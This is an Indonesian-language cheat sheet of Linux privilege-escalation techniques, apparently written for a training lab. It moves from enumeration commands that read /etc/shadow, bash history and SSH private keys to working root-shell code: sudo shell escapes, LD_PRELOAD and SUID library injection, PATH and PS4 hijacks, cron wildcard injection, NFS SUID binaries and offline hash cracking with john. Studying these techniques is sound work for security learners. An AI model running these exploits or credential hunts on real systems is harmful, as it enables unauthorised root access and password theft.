# Linux Privilege Escalation

## Tujuan

Memahami metadata sistem (distro, kernel, arsitektur, proses, user, network, dan credential) untuk menilai permukaan risiko dalam konteks privilege escalation.

---

## Topik yang Disarankan

- Konsep versi OS & kernel
- Cara membaca output diagnostik
- Observasi awal sebelum eksploitasi
- Identifikasi service, user, dan network environment
- Potensi celah dari password dan key management

---

## Checklist (Konseptual)

- [ ] Catat versi distro & kernel
- [ ] Identifikasi proses kritikal dan service
- [ ] Enumerasi user & permission
- [ ] Observasi konfigurasi jaringan
- [ ] Periksa keberadaan credential/password
- [ ] Cek konsistensi update/patch management

---

## Materi & Command

### 🔹 System Enumeration

Digunakan untuk mengidentifikasi detail sistem.

```bash
# Basic system information
hostname
uname -a
ps aux
```

### 🔹 User Enumeration
Melihat user, hak akses, dan history command.

```bash
whoami                               # Mengetahui user saat ini
sudo -l                              # Mengecek command yang bisa dijalankan dengan sudo
cat /etc/passwd                      # Menampilkan daftar user sistem
cat /etc/passwd | cut -d : -f 1      # Hanya list username
cat /etc/shadow                      # Menyimpan hash password (butuh root)
cat /etc/group                       # Menampilkan daftar group
history                              # Riwayat perintah terminal
```
### 🔹 Network Enumeration
```bash
Mengetahui konfigurasi dan koneksi jaringan.

ifconfig         # Informasi interface jaringan (IP, MAC)
ip a             # Alternatif ifconfig, detail IP & interface
ip route         # Menampilkan routing table
arp -a           # Cache ARP, host lain di LAN
netstat -ano     # Koneksi aktif, port listening, PID
```

### 🔹 Password & Credential Enumeration
Mencari file yang mungkin menyimpan password atau private key.
```bash
locate password | more          # Cari file dengan kata "password"
locate pass | more              # Cari file dengan kata "pass"
find / -name id_rsa 2>/dev/null # Cari private SSH key
```

### 🔹 Automated Tools
```bash
# Popular privilege escalation tools
linPeas
linenum
linux-exploit-suggester
linuxPrivChecker
```

### 🔹 Kernel Exploit
```bash
# Check kernel version
uname -a
# Output: Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux

# Exploit: DirtyCow (CVE-2016-5195)
# Before exploit:
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

# After successful exploit:
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

### 🔹  Escalation via Stored Passwords
```bash
# Search in history
history | grep pass
cat /home/user/.irssi/config | grep -i passw
# Result: user, password321

# Search in bash history
cat ~/.bash_history | grep -i passw
# Result: mysql, root, password123
```

### 🔹Escalation via Weak File Permissions
```bash
# Check shadow file permissions
ls -la /etc/shadow

# Extract password files
cat /etc/passwd > passwd.txt
cat /etc/shadow > shadow.txt

# On attacker machine:
unshadow passwd.txt shadow.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### 🔑 Escalation via SSH Keys
```bash
# Find SSH private keys
find / -name id_rsa 2> /dev/null

# On attacker machine:
chmod 400 id_rsa
ssh -i id_rsa root@<target_ip>
```

### ⚡ SUDO Exploitation
```bash
sudo -l
sudo find /bin -name nano -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
sudo vim -c '!sh'
```

###  Abusing Intended Functionality
```bash
sudo -l
sudo apache2 -f /etc/shadow
# Copy root hash and crack with John
echo '[root_hash]' > hash.txt
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
```

### LD_PRELOAD Exploitation
```bash
// x.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
```

### 🎯 SUID Exploitation 
```bash
find / -type f -perm -04000 -ls 2>/dev/null
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"

// libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

mkdir /home/user/.config
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so
```

### Environment Variables #1 
```bash
find / -type f -perm -04000 -ls 2>/dev/null
strings /usr/local/bin/suid-env

# Exploitation
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```

### Environment Variables #2 
```bash
# Method 1
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2

# Method 2
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

### Symlinks (Nginx Example) 
```bash
# Check nginx installation
dpkg -l | grep nginx

# Exploitation requires www-data user
su root
# password: password123
su -l www-data
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log

# In another terminal as root:
invoke-rc.d nginx rotate >/dev/null 2>&1
```

### 🛡️ Capabilities Exploitation 
```bash
# Find capabilities
getcap -r / 2>/dev/null

# Exploit cap_setuid
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### ⏰ Cron Jobs Exploitation
```bash
cat /etc/crontab
# Note the PATH variable

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# Wait 1 minute
/tmp/bash -p
```

### Wildcards Exploitation
```bash
cat /etc/crontab
cat /usr/local/bin/compress.sh

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
# Wait 1 minute
/tmp/bash -p
```

### File Overwrite
```bash
cat /etc/crontab
ls -l /usr/local/bin/overwrite.sh

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
# Wait 1 minute
/tmp/bash -p
```

### 📁 NFS Exploitation
```bash
# Check exports
cat /etc/exports
# Look for "no_root_squash" option

# On attacker machine:
showmount -e <target_ip>
mkdir /tmp/1
mount -o rw,vers=2 <target_ip>:/tmp /tmp/1

# Create exploit
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x

# On target machine:
/tmp/x
```



